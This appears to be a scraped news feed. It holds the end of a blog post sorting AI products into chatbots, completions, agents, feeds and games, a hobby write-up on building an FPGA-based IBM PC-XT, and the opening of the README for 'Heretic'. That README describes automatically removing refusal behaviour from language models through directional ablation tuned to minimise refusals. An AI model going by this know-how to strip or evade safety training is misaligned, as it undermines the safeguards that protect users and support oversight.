<p>The reason agents work and chatbots-with-tools don‚Äôt is the difference between asking an LLM to hit a single button for you and asking the LLM to hit a hundred buttons in a specific order. Even though each individual action would be easier for a human to perform, agentic LLMs are now smart enough to take over the entire process.</p>
<p>Coding agents are a natural fit for AI agents for two reasons:</p>
<ul>
<li>It‚Äôs easy to verify changes by running tests or checking if the code compiles</li>
<li>AI labs are incentivized to produce effective coding models to accelerate their own work</li>
</ul>
<p>For my money, the current multi-billion-dollar question is <strong>can AI agents be useful for tasks other than coding?</strong> Bear in mind that Claude Sonnet 3.7<sup id="fnref-4"><a href="#fn-4">4</a></sup> was released just under <em>nine months ago</em>. In that time, the tech industry has successfully built agentic products about their own work. They‚Äôre just starting to build agentic products for other tasks. It remains to be seen how successful that will be, or what those products will look like.</p>
<h4>Research</h4>
<p>There‚Äôs another kind of agent that isn‚Äôt about coding: the research agent. LLMs are particularly good at tasks like ‚Äúskim through ten pages of search results‚Äù or ‚Äúkeyword search this giant dataset for any information on a particular topic‚Äù. I use this functionality a lot for all kinds of things.</p>
<p>There are a few examples of AI products built on this capability, like <a href="https://www.perplexity.ai/">Perplexity</a>. In the big AI labs, this has been absorbed into the chatbot products: OpenAI‚Äôs ‚Äúdeep research‚Äù went from a separate feature to just what GPT-5-Thinking does automatically, for instance.</p>
<p>I think there‚Äôs almost certainly potential here for area-specific research agents (e.g. in medicine or law).</p>
<h3>Feeds</h3>
<p>If agents are the most recent successful AI product, AI-generated feeds might be the one just over the horizon. AI labs are currently experimenting with ways of producing infinite feeds of personalized content to their users:</p>
<ul>
<li>Mark Zuckerberg has talked about filling Instagram with auto-generated content</li>
<li>OpenAI has recently launched a Sora-based video-gen feed</li>
<li>OpenAI has also started pushing users towards ‚ÄúPulse‚Äù, a personalized daily update inside the ChatGPT product</li>
<li>xAI is <a href="https://www.testingcatalog.com/grok-will-get-infinite-image-gen-and-video-gen-with-sounds/">working on</a> putting an infinite image and video feed into Twitter</li>
</ul>
<p>So far none of these have taken off. But scrolling feeds has become the primary way users interact with technology <em>in general</em>, so the potential here is massive. It does not seem unlikely to me at all that in five years time most internet users will spend a big part of their day scrolling an AI-generated feed.</p>
<p>Like a completions-based product, the advantage of a feed is that users don‚Äôt have to interact with a chatbot. The inputs to the model come from how the user interacts with the feed (likes, scrolling speed, time spent looking at an item, and so on). Users can experience the benefits of an LLM-generated feed (if any) without having to change their consumption habits at all.</p>
<p>The technology behind current human-generated infinite feeds is already a mature application of state of the art machine learning. When you interact with Twitter or LinkedIn, you‚Äôre interacting with a model, except instead of generating text it‚Äôs generating lists of other people‚Äôs posts. In other words, <strong>feeds already maintain a sophisticated embedding of your personal likes and dislikes</strong>. The step from ‚Äúuse that embedding to surface relevant content‚Äù to ‚Äúuse that embedding to <em>generate</em> relevant content‚Äù might be very short indeed.</p>
<p>I‚Äôm pretty suspicious of AI-generated infinite feeds of generated video, but I do think other kinds of infinite feeds are an under-explored kind of product. In fact, I built a feed-based hobby project of my own, called <a href="https://www.autodeck.pro/">Autodeck</a><sup id="fnref-5"><a href="#fn-5">5</a></sup>. The idea was to use an AI-generated feed to generate spaced repetition cards for learning. It works pretty well! It still gets a reasonable amount of use from people who‚Äôve found it via my blog (also, from myself and my partner).</p>
<h3>Games</h3>
<p>One other kind of AI-generated product that people have been talking about for years is the AI-based video game. The most speculative efforts in this direction have been full world simulations like DeepMind‚Äôs <a href="https://deepmind.google/blog/genie-3-a-new-frontier-for-world-models/">Genie</a>, but people have also explored using AI to generate a subset of game content, such as pure-text games like <a href="https://aidungeon.com/">AI Dungeon</a> or this <a href="https://www.nexusmods.com/skyrimspecialedition/mods/98631">Skyrim mod</a> which adds AI-generated dialogue. Many more game developers have incorporated AI art or <a href="https://www.polygon.com/arc-raiders-ai-voices-the-finals-embark-studios/">audio</a> assets into their games.</p>
<p>Could there be a transformative product that incorporates LLMs into video games? I don‚Äôt think ARC Raiders counts as an ‚ÄúAI product‚Äù just because it uses AI voice lines, and the more ambitious projects haven‚Äôt yet really taken off. Why not?</p>
<p>One reason could be that <strong>games just take a really long time to develop</strong>. When <em>Stardew Valley</em> took the world by storm in 2016, I expected a flood of copycat cozy pixel-art farming games, but that only really started happening in 2018 and 2019. That‚Äôs how long it takes to make a game! So even if someone has a really good idea for an LLM-based video game, we‚Äôre probably still a year or two out from it being released.</p>
<p>Another reason is that <strong>many gamers really don‚Äôt like AI</strong>. Including generative AI in your game is a guaranteed controversy (though it doesn‚Äôt seem to be fatal, as the success of ARC Raiders shows). I wouldn‚Äôt be surprised if some game developers simply don‚Äôt think it‚Äôs worth the risk to try an AI-based game idea<sup id="fnref-6"><a href="#fn-6">6</a></sup>.</p>
<p>A third reason could be that <strong>generated content is just not a good fit for gaming</strong>. Certainly ChatGPT-like dialogue sticks out like a sore thumb in most video games. AI chatbots are also pretty bad at <em>challenging</em> the user: their post-training is all working to make them try to satisfy the user immediately<sup id="fnref-7"><a href="#fn-7">7</a></sup>. Still, I don‚Äôt think this is an insurmountable technical problem. You could simply post-train a language model in a different direction (though perhaps the necessary resources for that haven‚Äôt yet been made available to gaming companies).</p>
<h3>Summary</h3>
<p>By my count, there are three successful types of language model product:</p>
<ul>
<li>Chatbots like ChatGPT, which are used by hundreds of millions of people for a huge variety of tasks</li>
<li>Completions coding products like Copilot or Cursor Tab, which are very niche but easy to get immediate value from</li>
<li>Agentic products like Claude Code, Codex, Cursor, and Copilot Agent mode, which have only really started working in the last six months</li>
</ul>
<p>On top of that, there are two kinds of LLM-based product that don‚Äôt work yet but may soon:</p>
<ul>
<li>LLM-generated feeds</li>
<li>Video games that are based on AI-generated content</li>
</ul>
<p>Almost all AI products are just chatbots (e.g. AI-powered customer support). These suffer from having to compete with ChatGPT, which is a superior general product, and not being able to use powerful tools, because users will be able to easily jailbreak the model.</p>
<p>Agentic products are new, and have been wildly successful <em>for coding</em>. It remains to be seen what they‚Äôll look like in other domains, but we‚Äôll almost certainly see domain-specific research agents in fields like law. Research agents in coding have seen some success as well (e.g. code review or automated security scanning products).</p>
<p>Infinite AI-generated feeds haven‚Äôt yet been successful, but hundreds of millions of dollars are currently being poured into them. Will OpenAI‚Äôs Sora be a real competitor to Twitter or Instagram, or will those companies release their own AI-generated feed product?</p>
<p>AI-generated games sound like they could be a good idea, but there‚Äôs still no clear working strategy for how to incorporate LLMs into a video game. Pure world models - where the entire game is generated frame-by-frame - are cool demos but a long way from being products.</p>
<p>One other thing I haven‚Äôt mentioned is image generation. Is this part of a chatbot product, or a tool in itself? Frankly, I think AI image generation is still more of a toy than a product, but it‚Äôs certainly seeing a ton of use. There‚Äôs probably some fertile ground for products here, if they can successfully differentiate themselves from the built-in image generation in ChatGPT.</p>
<p>In general, it feels like the early days of the internet. LLMs have so much potential, but we‚Äôre still mostly building copies of the same thing. There have to be some really simple product ideas that we‚Äôll look back on and think ‚Äúthat‚Äôs so obvious, I wonder why they didn‚Äôt do it immediately‚Äù.</p>
<p>edit: This post got quite a few comments on <a href="https://news.ycombinator.com/item?id=45946498">Hacker News</a>. Some  commenters think <a href="https://news.ycombinator.com/item?id=45946878">my categories are too broad</a>, which is a fair criticism: like saying that there are only two ‚Äúelectricity products‚Äù, ones which turn a motor and ones which heat up a wire.</p>
<p>Other commenters argue that summarization, easy translation, and transcription are products I‚Äôve missed. I disagree: have you yourself purchased some piece of LLM-driven summarization, translation or transcription software? Probably not - you just use a chatbot directly, right? I thus think of those as <em>features</em> of the chatbot product, not products in their own right.</p>
<p>One commenter <a href="https://news.ycombinator.com/item?id=45946957">points out</a> that there may be a bunch of zero-hype products bubbling away under the radar. Fair enough! I don‚Äôt know what I don‚Äôt know.</p>
</section><p>If you liked this post, consider<!-- --> <a href="https://buttondown.com/seangoedecke" target="_blank">subscribing</a> <!-- -->to email updates about my new posts, or<!-- --> <a href="https://news.ycombinator.com/submitlink?u=https://www.seangoedecke.com/ai-products/&amp;t=Only%20three%20kinds%20of%20AI%20products%20actually%20work" target="_blank">sharing it on Hacker News</a>.<!-- --> Here's a preview of a related post that shares tags with this one.</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Dissecting Flock Safety: The Cameras Tracking You Are a Security Nightmare [video] (144 pts)]]></title>
            <link>https://www.youtube.com/watch?v=uB0gr7Fh6lY</link>
            <guid>45945960</guid>
            <pubDate>Sun, 16 Nov 2025 15:50:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=uB0gr7Fh6lY">https://www.youtube.com/watch?v=uB0gr7Fh6lY</a>, See on <a href="https://news.ycombinator.com/item?id=45945960">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[FPGA Based IBM-PC-XT (124 pts)]]></title>
            <link>https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/</link>
            <guid>45945784</guid>
            <pubDate>Sun, 16 Nov 2025 15:26:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/">https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/</a>, See on <a href="https://news.ycombinator.com/item?id=45945784">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg"><img data-attachment-id="2427" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/img_5334/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg" data-orig-size="4541,3706" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon EOS R8&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1761477878&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;25600&quot;,&quot;shutter_speed&quot;:&quot;0.004&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="IMG_5334" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=874" width="1024" height="835" src="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=1024" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=1024 1024w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=2048 2048w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=300 300w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=768 768w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=1440 1440w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div>


<hr>



<p>Recently I undertook a hobby project to recreate an IBM XT Personal Computer from the 1980s using a mix of authentic parts and modern technology. I had a clear goal in mind: I wanted to be able to play the EGA version of Monkey Island 1 on it, with no features missing. This means I need mouse support, hard drive with write access for saving the game, and Adlib audio, my preferred version of the game‚Äôs musical score.</p>



<p>The catalyst for this project was the discovery that there are low-power versions of the NEC V20 CPU available (<a href="https://github.com/bit-hack/iceXt/blob/master/datasheets/UPD70108H.PDF">UPD70108H</a>), which is compatible with the Intel 8088 used in the XT. Being a low-power version significantly simplifies its connection to an FPGA, which typically operate with 3.3-volt IO voltages. Coupled with a low-power 1MB SRAM chip (<a href="https://github.com/bit-hack/iceXt/blob/master/datasheets/CY62158EV30.pdf">CY62158EV30</a>) to provide the XT with its 640KB of memory, and I started to have the bones of a complete system worked out.</p>



<p>I started off by designing the hardware of the system, which would then serve as my development board while I worked on the software/gateware. The following features were added:<br>‚Äì DIP-40 socket for an low power NEC V20 CPU<br>‚Äì 1MB SRAM chip for the system memory<br>‚Äì An <a href="https://github.com/wuxx/icesugar-pro">icesugar-pro</a> FPGA board with a Lattice LFE5U-25F<br>‚Äì Dual PS/2 connectors for keyboard and mouse<br>‚Äì Micro SD card socket to act as a Fixed Disk<br>‚Äì An authentic YM3014B digital-to-analogue converter for audio<br>‚Äì A Piezo speaker that can be driven by the programmable-interval-timer for system bleeps<br>‚Äì Lastly, a reset switch and some status LEDs</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png"><img data-attachment-id="2433" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/schematic_minixt_2025-11-10/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png" data-orig-size="1801,1202" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Schematic_MiniXt_2025-11-10" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=874" width="1024" height="683" src="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=1024" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=1024 1024w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=300 300w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=768 768w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=1440 1440w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png 1801w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div>


<hr>



<p>I drew up my design using the EasyEDA CAD software as I‚Äôm already familiar with it, and it has really good integration with the JLCPCB PCB assembly service. Some of the components in the design are too tricky for me to hand solder by myself. I did however have to solder the SRAM chips once the boards arrived since they were not stocked by LCSC so I had to source them elsewhere.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image.png"><img data-attachment-id="2430" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-2/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image.png" data-orig-size="895,757" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=874" width="895" height="757" src="https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=895" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image.png 895w, https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=300 300w, https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=768 768w" sizes="(max-width: 895px) 100vw, 895px"></a></figure></div>


<hr>



<p>The first step was to write a bus controller for the processor. The V20 CPU clock is more forgiving than an original i8088 since its can be run right down to 0hz and its uses a regular 50% duty cycle. The external interface for an 8088 CPU operates in terms of bus cycles. At that start of a bus cycle the CPU asserts some pins to let everyone know what it wants to try and do‚Ä¶ read memory, write to IO, etc. Each type of bus cycle follows a specific sequence of events that happen over a number of clock cycles. It was straight forward to make a state machine that could detect the start of a bus-cycle, figure out what kind it was, and then produce or consume the data as needed by the CPU. Key here, was to make sure that all of the timing requirements were met, so that signals the CPU generates are sampled at the correct time, and signals the CPU requires have been driven correctly before the CPU reads them.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png"><img data-attachment-id="2462" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-5/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png" data-orig-size="489,593" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=247" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=489" loading="lazy" width="489" height="593" src="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=489" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png 489w, https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=124 124w, https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=247 247w" sizes="(max-width: 489px) 100vw, 489px"></a><figcaption>An example memory write bus cycle timing diagram.</figcaption></figure></div>


<p>My first test for the bus controller was to write a simple program using NASM to be executed on the V20, with a simple goal‚Ä¶ it will flash an LED mapped to an IO port address. Simple, but a blinking LED seems to be the hardware equivalent of the software hello-world. For the initial version, the program was simply loaded into a FPGA block ram and used directly as the system memory.</p>



<p>Later, I used a more complex approach for memory accesses. The bios, for example, is loaded into an FPGA block ram, so that CPU memory reads will come from that rather than the system SRAM chip. Video memory is implemented a differently still. CPU memory writes are passed to both the video memory block ram and system SRAM, but CPU reads alway come from only the system SRAM. This then means that I have a spare read port on the video block ram that can then be used by the VGA signal generator to display the video memory contents.</p>



<p>After my success with a blinky program, I installed a virtual copy of <a href="https://www.minuszerodegrees.net/supersoft_landmark/Supersoft%20Landmark%20ROM.htm">Supersoft/Landmark Diagnostic ROM</a> in place of the BIOS and wrote a basic CGA adapter for video output. I was then able to use the diagnostic ROM to test the SRAM memory interface as well as some of the peripherals required by the XT such as the <a href="https://en.wikipedia.org/wiki/Programmable_interval_timer">programmable-interval-timer</a> (i8253) and <a href="https://en.wikipedia.org/wiki/Programmable_interrupt_controller">programmable-interrupt-controller</a> (i8259).</p>



<p>Once I was confident the basic system was stable I then swaped in a generic XT bios from <a href="https://www.phatcode.net/downloads.php?id=101">https://www.phatcode.net</a> in place of the diagnostic ROM. It was amazing to see the bios start to boot up, and complain when it couldnt find a boot disk.</p>



<p>Fixed Disk access is achieved by making a small Verilog SPI controller accessible to the CPU via some unused IO ports. I then wrote an option ROM to handle BIOS INT13H (disk service) calls, which had routines that could issue commands to the SD-Card over SPI. The tricky part for me was learning the SD card protocol and then writing 8088 assembly to perform the correct operations. The mapping itself is very straightforward as both SD card and DOS assume 512byte sectors.</p>



<p>I saved a lot of time when writing the option ROM by developing and debugging the code using a software emulator of the board that I cobbled together. Some historic sources for it can be found here: <a href="https://github.com/bit-hack/iceXt/tree/master/misc/emulator">https://github.com/bit-hack/iceXt/tree/master/misc/emulator</a></p>



<p>Perhaps the hardest part of the project was, surprisingly, getting the mouse to work. Mice of the XT era would typically be connected to a UART serial port. I had however placed a PS/2 connector on the hardware board, and those mice use a very different protocol. In my efforts to support a mouse I startedto learn about PS/2 devices, however I would need to implement a much more complex keyboard controller, and the BIOS I was also lacked support for such modern peripherals, and I just plain didn‚Äôt feel like I understood everything required to get that working.</p>



<p>What makes it tricky is that PS/2 is a bidirectional protocol, and the mouse has to be asked by the PC to broadcast updates, otherwise we will not receive any. That added a lot more complexity than I was wanting. The keyboard on the otherhand is relatively easy to work with and send out keypresses without having to be asked.</p>



<p>I chose an alternative. I wrote some Verilog code to talk directly to the PS/2 mouse, which would early in the boot process tell it to start sending over mouse events, as they have to be requested. When the bridge then receives mouse events, it translates and presents them to the computer via a pseudo UART peripheral. I had implemented a basic PS/2 mouse to Serial mouse bridge. A little convoluted but it works really well.</p>



<p>During this process, I lobotomised a spare mouse by attaching a logic analyser the clk and dat pads inside the mouse. I was then able to capture the communications between a real PC and the mouse and observe it during use. This gave me invaluable insight into exactly how the protocol worked, and what a real mouse expected.</p>



<p>I also found that having real waveforms to look at made it much easier to test components of my design in <a href="https://www.veripool.org/verilator/">verilator</a>, a Verilog simulator, as I could closely model the stimulus it should see when running in the FPGA.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png"><img data-attachment-id="2444" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-4/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png" data-orig-size="558,111" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=558" loading="lazy" width="558" height="111" src="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=558" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png 558w, https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=300 300w" sizes="(max-width: 558px) 100vw, 558px"></a><figcaption>I had to anotate these waveform captures by hand to better understand the PS/2 protocol.</figcaption></figure></div>


<hr>



<p>Just like the XT, one of the channels of the PIT timer is used to drive the internal speaker to produce bleep and bloop sounds. I extended this by having disk accesses trigger short pulses out of the peizo speaker as a crude emulation of a hard disk seeking. I think it really adds to the experience when you can hear your computer thinking away while doing its tasks. When it comes to music, the internal PC speaker quickly looses its charm however. Writing an YM3812 implementation (the FM chip used in the Adlib card) is beyond my skill level but thankfully Jose Tejada has written an amazing open source version that I was able to pull into my project; <a href="https://github.com/jotego/jtopl">https://github.com/jotego/jtopl</a>.</p>



<p>I wrote a small Verilog module to take the PCM sample data generated by this soft YM3812 and convert it to the unusual 3:10 floating point format required by the YM3014 DAC on my board. This is very similar to the operation of the real Adlib hardware, where the YM3812 generates and sends serial audio data to a YM3014 DAC chip. A modern I2S DAC may have been cleaner, but having a chance to play with the authentic DAC seemed a little more fun to me. All of this combined results in the same lovely crisp FM tones I was so fond of when I played games on my PC growing up.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png"><img data-attachment-id="2468" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-6/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png" data-orig-size="462,320" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=462" loading="lazy" width="462" height="320" src="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=462" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png 462w, https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=300 300w" sizes="(max-width: 462px) 100vw, 462px"></a><figcaption>The YM3014 uses a 10bit DAC feeding into a 3bit divider for more dynamic range.</figcaption></figure></div>


<p>A lot of other elements of this project have been glossed over or omitted, such as support for CGA and EGA graphics. There is even a USB to UART bridge for sending files from a host PC directly to the SD card. I also made some nice clear acrylic panels on a CNC machine to round off the design and protect the bare PCB.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1.jpg"><img data-attachment-id="2477" data-permalink="https://bit-hack.net/pxl_20251113_131957299-3/" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg" data-orig-size="3670,2756" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.89&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 8a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1763039997&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;5.43&quot;,&quot;iso&quot;:&quot;59&quot;,&quot;shutter_speed&quot;:&quot;0.019996&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;,&quot;latitude&quot;:&quot;55.994572222222&quot;,&quot;longitude&quot;:&quot;-2.5042972222222&quot;}" data-image-title="PXL_20251113_131957299" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=874" loading="lazy" width="3670" height="2756" src="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg 3670w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=150&amp;h=113 150w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=300&amp;h=225 300w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=768&amp;h=577 768w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=1024&amp;h=769 1024w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=1440&amp;h=1081 1440w" sizes="(max-width: 3670px) 100vw, 3670px"></a></figure></div>


<p>A video demo is shown below.<br>Unfortunately there is a ton of screen tearing due to the phase between the monitor and my camera. It isn‚Äôt visible in person.</p>



<figure><div><p><iframe title="FPGA-Based IBM PC-XT Clone" width="874" height="492" src="https://www.youtube.com/embed/EmwGfURk4s8?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p></div></figure>



<hr>



<p>Source code, schematics and gerber files are available on github here: <a href="https://github.com/bit-hack/iceXt">https://github.com/bit-hack/iceXt</a></p>



<p>Thanks for reading!</p>




			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Heretic: Automatic censorship removal for language models (363 pts)]]></title>
            <link>https://github.com/p-e-w/heretic</link>
            <guid>45945587</guid>
            <pubDate>Sun, 16 Nov 2025 15:00:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/p-e-w/heretic">https://github.com/p-e-w/heretic</a>, See on <a href="https://news.ycombinator.com/item?id=45945587">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Heretic: Fully automatic censorship removal for language models</h2><a id="user-content-heretic-fully-automatic-censorship-removal-for-language-models" aria-label="Permalink: Heretic: Fully automatic censorship removal for language models" href="#heretic-fully-automatic-censorship-removal-for-language-models"></a></p>
<p dir="auto">Heretic is a tool that removes censorship (aka "safety alignment") from
transformer-based language models without expensive post-training.
It combines an advanced implementation of directional ablation, also known
as "abliteration" (<a href="https://arxiv.org/abs/2406.11717" rel="nofollow">Arditi et al. 2024</a>),
with a TPE-based parameter optimizer powered by <a href="https://optuna.org/" rel="nofollow">Optuna</a>.</p>
<p dir="auto">This approach enables Heretic to work <strong>completely automatically.</strong> Heretic
finds high-quality abliteration parameters by co-minimizing the number of
refusals and the KL divergence from the original model. This results in a
decensored model that retains as much of the original model's intelligence
as possible. Using Heretic does not require an understanding of transformer
internals. In fact, anyone who knows how to run a command-line program
can use Heretic to decensor language models.</p>
